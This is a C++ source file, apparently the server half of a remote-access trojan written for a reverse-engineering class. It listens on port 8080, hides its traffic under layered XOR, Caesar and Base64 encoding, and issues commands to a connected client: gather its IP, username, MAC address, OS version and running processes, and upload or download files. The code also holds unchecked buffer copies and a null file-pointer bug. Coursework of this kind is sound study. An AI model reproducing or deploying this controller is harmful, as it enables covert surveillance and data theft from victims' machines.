#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ws2def.h>
#include <windows.h>
#include <io.h>
//#include <netdb.h>
//#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
//#include <sys/socket.h>
#include <sys/types.h>
#include <iostream>
#include <errno.h>
#include <unistd.h> // read(), write(), close()
#include <string>
#include <cctype>
#include <vector>
#include <cmath>
#define MAX 1024
#define PORT "8080"
#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)

#pragma comment(lib, "WS2_32")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Caesar Cipher
int caesar_shift = 3;

// XOR Encryption
string key1 = "csec476";
string key2 = "reversingproject";

// Base64 characters
static const string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode functions ...
string xor_encrypt(const string input, const string key) {
    string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.size()];
    }
    return output;
}

string caesar_encrypt(const string input) {
    string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset + caesar_shift) % 26 + offset;
        } else {
            output[i] = input[i];
        }
    }
    return output;
}

string caesar_decrypt(const string input) {
    string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset - caesar_shift + 26) % 26 + offset;
        } else {
            output[i] = input[i];
        }
    }
    return output;
}

string base64_encode(const string input) {
    string output;
    int val = 0;
    int valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            output.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        output.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (output.size() % 4) {
        output.push_back('=');
    }
    return output;
}

string base64_decode(const string input) {
    string output;
    vector<int> T(256, -1);
    for (size_t i = 0; i < BASE64_CHARS.size(); i++) {
        T[BASE64_CHARS[i]] = i;
    }

    int val = 0;
    int valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) {
            break;
        }
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            output.push_back(static_cast<char>((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return output;
}

// Encode Decode Comb
string encrypt(const string input) {
    // Step 1: XOR
    string xor_encrypted = xor_encrypt(input, key1);

    // Step 2: Caesar Cipher
    string caesar_encrypted = caesar_encrypt(xor_encrypted);

    // Step 3: Base64
    string base64_encoded = base64_encode(caesar_encrypted);

    // Step 4: XOR again
    string final_encrypted = xor_encrypt(base64_encoded, key2);

    return final_encrypted;
}

string decrypt(const string input) {
    // Step 1: XOR
    string xor_decrypted = xor_encrypt(input, key2);

    // Step 2: Base64
    string base64_decoded = base64_decode(xor_decrypted);

    // Step 3: Caesar Cipher
    string caesar_decrypted = caesar_decrypt(base64_decoded);

    // Step 4: XOR again
    string final_decrypted = xor_encrypt(caesar_decrypted, key1);

    return final_decrypted;
}
   
// Function designed for chat between client and server.
void func(SOCKET connfd)
{
    char buff[MAX];
    int n;
    //char filename[20];
    bool exit = false;
    char before[MAX];
    // infinite loop for chat
    for (;;) {
        bzero(buff, MAX);
        //bzero(filename, 20);
        cout << "Command for client : " << endl;
        n = 0;
        // copy server message in the buffer
        while ((buff[n++] = getchar()) != '\n')
            ;
        if(strncmp("EXIT", buff, 4) == 0) {
            exit = true;
        }
        strncpy(before, buff, sizeof(buff));
        if (strstr(buff, "DOWNLOAD")) {
            char* token = strtok(before, " ");
            token = strtok(NULL, " "); // download from
            char downloadFile[100];
            strcpy(downloadFile, token);
            //downloadFile[strlen(downloadFile)-1] = '\0';
            cout << "file path download from " << downloadFile << endl;
            FILE* file;
            char fileContent[1024];
            if ((file = fopen(downloadFile, "r")) == NULL) {
                cout << "File Not Found on Server!\n" << endl;
            }
            fseek(file, 0, SEEK_END);
            long len = ftell(file);
            fseek(file, 0, SEEK_SET);
            bzero(fileContent, MAX);
            fread(fileContent, 1, len, file);
            fclose(file);

            printf("\nfile content: %s\n", fileContent);
            char n = '\n';
            strncat(buff, &n, 1);
            strcat(buff, fileContent);
        }

        printf("buffer: %s\n", before);
        string encryptedBuff = encrypt(string(buff));
        strncpy(buff, encryptedBuff.c_str(), encryptedBuff.size());
        buff[encryptedBuff.size()] = '\0';
        printf("\nencrypted buffer: %s", buff);

        string decryptedBuff2 = decrypt(string(before));
        // THIS IS WHERE SOME WEIRD ERROR IS SOMETIMES HAPPENING?
        cout << "\n\ndecrypted buff: " << decryptedBuff2 << endl;

        // and send that buffer to client
        send(connfd, buff, sizeof(buff), 0);

        // if msg contains "Exit" then server exit and chat ended.
        if (exit) {
            cout << "Server Exit...\n" << endl;
            break;
        }

        // read the message from client and copy it in buffer
        recv(connfd, buff, sizeof(buff), 0);
        string decryptedBuff = decrypt(string(buff));
        strncpy(buff, decryptedBuff.c_str(), decryptedBuff.size());
        buff[decryptedBuff.size()] = '\0';

        if (strstr(before, "UPLOAD")) {
            char* token = strtok(before, " ");
            token = strtok(NULL, " "); // upload from
            token = strtok(NULL, " "); // upload to
            char path[100];
            strcpy(path, token);
            path[strlen(path)-1] = '\0';
            cout << "file path to upload to: " << path << endl;
            FILE * file;
            if ((file = fopen(path, "w")) == NULL) {
                cout << "unable to create file on server!\n" << endl;
            }
            fputs(buff, file);
            cout << "\nfile contents received: " << buff << endl;
            fclose(file);
        }

        // print buffer which contains the client contents
        cout << "\nClient's response:\n" << buff << endl;
        bzero(buff, MAX);
    }
}

// Driver function
int main()
{
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[MAX];
    int recvbuflen = MAX;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    printf("server address and port resolved!\n");

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
    printf("socket is up!\n");

    // Setup the TCP listening socket
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    printf("is listening for client connections!\n");

    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    cout << "\nInformation to get from client:\n\tIPADDRESS : this will gather the client's IP Addess\n\t"
        "USERNAME : this will gather the client's username\n\tMACADDRESS : this will gather the client's " 
        "MAC Address\n\tOS VERSION : this will gather the client's Operating System\n\tRUNNING PROCESSES : this will "
        "list out the client's running processes\n\tUPLOAD <upload_from_path> <upload_to_path> : this will upload"
        " a file to the client\n\tDOWNLOAD <download_from_path> <download_to_path> : this will download a file from "
        "the client\n\tEXIT: close the server socket\n\n" << endl;

    func(ClientSocket);

    // No longer need server socket
    closesocket(ListenSocket);
}
